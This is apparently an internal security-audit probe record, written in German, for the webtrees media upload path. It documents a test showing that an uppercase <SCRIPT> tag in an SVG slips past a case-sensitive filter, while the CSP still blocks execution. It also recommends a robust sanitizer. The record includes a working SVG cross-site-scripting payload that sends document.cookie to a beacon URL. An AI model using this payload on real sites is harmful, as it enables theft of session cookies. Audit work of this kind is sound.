<!-- SPDX-License-Identifier: AGPL-3.0-or-later -->

# Probe Decision — SEC-AUDIT-001 / H1 / iter1

- **Hypothesis:** H1 — Case-Bypass des `<script`-Substring-Filters
- **Iteration:** 1
- **Run-Timestamp:** 2026-04-08 21:32 CEST
- **Executor:** Layer3 PHPUnit integration test (`SecAudit001Test::test_h1_case_bypass_script_passes_l1_filter`)
- **Command:**
  ```bash
  podman-compose exec webtrees vendor/bin/phpunit \
    --configuration=/tests/layer3-integration/phpunit-integration.xml \
    --filter='SecAudit001Test::test_h1_case_bypass_script_passes_l1_filter' \
    --no-coverage
  ```

## Probe-Aufbau

Direkt-Invocation der beiden betroffenen Code-Einheiten, um den HTTP-Request-Overhead zu vermeiden:

1. `MediaFileService::uploadFile()` mit `file_location=upload`, `folder=''`, `auto=0`, `new_file=case_bypass.svg` und einer Uploaded-File mit Inhalt:
   ```xml
   <?xml version="1.0" standalone="no"?>
   <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
     <rect width="100" height="100" fill="red"/>
     <SCRIPT type="text/javascript">
       fetch('/audit-probe-beacon?h=H1&c=' + encodeURIComponent(document.cookie));
     </SCRIPT>
   </svg>
   ```
2. `ImageFactory::fileResponse($filesystem, $storedPath, false)` auf die gespeicherte Datei, exakt der Code-Pfad den `MediaFileDownload` in Produktion nimmt.

## Oracle-Ergebnisse

| Assertion | Erwartet | Beobachtet | ✓ / ✗ |
|---|---|---|---|
| Upload liefert nicht-leeren Pfad | `!== ''` | `case_bypass.svg` | ✓ |
| Datei auf Filesystem vorhanden | `fileExists == true` | `true` | ✓ |
| Response-Status | `200` | `200` | ✓ |
| Response Content-Type | `image/svg+xml` | `image/svg+xml` | ✓ |
| Response CSP-Header | `script-src none;frame-src none` | `script-src none;frame-src none` | ✓ |
| Response `x-image-exception` Header | **abwesend** (L1-Bypass) | abwesend | ✓ |
| Response-Body enthält `<SCRIPT` | ja | ja | ✓ |
| Response-Body enthält `cookie` | ja | ja | ✓ |

## Decision

**`hypothesis_confirmed` für L1-Layer**: Der `str_contains($data, '<script')`-Filter in `ImageFactory::imageResponse()` (Zeile 270) ist durch Case-Variation `<SCRIPT>` trivial zu umgehen. Der Filter ist case-sensitiv; der HTML/SVG-Parser der Browser ist case-insensitiv. Die Payload wurde unverändert ausgeliefert.

**L2-Layer (CSP) ist intakt**: Der Response enthält `content-security-policy: script-src none;frame-src none`. Diese CSP blockiert inline `<SCRIPT>`-Tags in einem als Top-Level-Dokument geladenen SVG. Der **real-world Exploit** (Script-Ausführung im Opfer-Browser) ist durch die CSP blockiert.

**Gesamt-Bewertung:** Defense-in-Depth-Gap. Der fragile L1-Filter vermittelt Sicherheit, die er nicht bietet. Der Code sollte durch einen robusten Sanitizer (z. B. XML-DOMDocument-basierte Allowlist, oder enshrined/svg-sanitizer-Bibliothek) ersetzt werden. Die CSP muss erhalten bleiben.

## Trace-Artefakt

Das SecurityTraceMiddleware wurde im Test NICHT aktiv durchlaufen, weil der Probe direkt die Service-/Factory-Methoden aufruft und nicht den HTTP-Stack durch die Middleware-Kette schickt. Das ist bewusst gewählt, weil der Bypass auf Unit-Code-Ebene liegt. Die Trace-Middleware würde hier keine zusätzliche Information liefern — der Exploit-Punkt ist im Response-Body selbst sichtbar.

## Next Action

- H2 (Event-Handler) als nächste Iteration ausführen — cross-check gegen identischen Bypass-Vektor.
- H3 später.
- H5 (lowercase Baseline) als Beweis dass der Filter nicht komplett kaputt ist.
